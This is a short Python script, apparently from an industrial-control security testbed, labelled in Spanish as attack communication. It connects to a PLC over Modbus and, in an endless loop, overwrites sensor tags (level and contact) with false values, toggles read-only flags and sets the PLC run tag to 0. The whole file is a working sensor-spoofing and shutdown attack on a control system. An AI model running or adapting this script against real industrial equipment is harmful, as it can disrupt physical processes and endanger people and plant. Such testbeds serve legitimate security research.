#!/usr/bin/env python

#########################################
# Imports
#########################################
# - Logging
import modbus
import logging

# - COmunicacion de ataques
from modbus	import ClientModbus as Client
from modbus	import ConnectionException 

# - World
from world import *

logging.basicConfig()
log = logging.getLogger()
log.setLevel(logging.INFO)

client = Client(PLC_SERVER_IP, port=PLC_SERVER_PORT)
try:
    client.connect()
    while True:
        rq = client.write(LEVEL_RO_ADDR, 1) 
        rq = client.write(LEVEL_TAG_SENSOR, 0) 
        rq = client.write(CONTACT_RO_ADDR, 1) 	
        rq = client.write(CONTACT_TAG_SENSOR, 0) 
        rq = client.write(PLC_RW_ADDR, 1) 	
        rq = client.write(PLC_TAG_RUN, 0)
except KeyboardInterrupt:
    client.close()
except ConnectionException:
    print "Unable to connect / Connection lost"
